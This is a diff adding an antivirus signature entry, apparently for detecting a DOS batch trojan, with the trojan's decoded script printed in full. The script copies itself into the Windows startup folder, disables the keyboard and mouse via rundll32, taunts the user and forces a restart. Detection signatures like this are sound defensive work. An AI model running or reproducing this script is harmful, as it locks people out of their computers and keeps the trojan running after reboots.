@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36598
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off copy %0 c:\windows\startm~1\programs\startup echo wanna see something annoying? c:\windows\rundll32.exe mouse,disable c:\windows\rundll32.exe keyboard,disable cls echo haha, you can't use your keyboard or mouse! cls shutdown -r -t -10 type nul | choice.com /n/cy/ty,3 >nul copy %0 c:\windows\startm~1\programs\startup start rundll.exe shell32.dll,shexitwindowsex 2
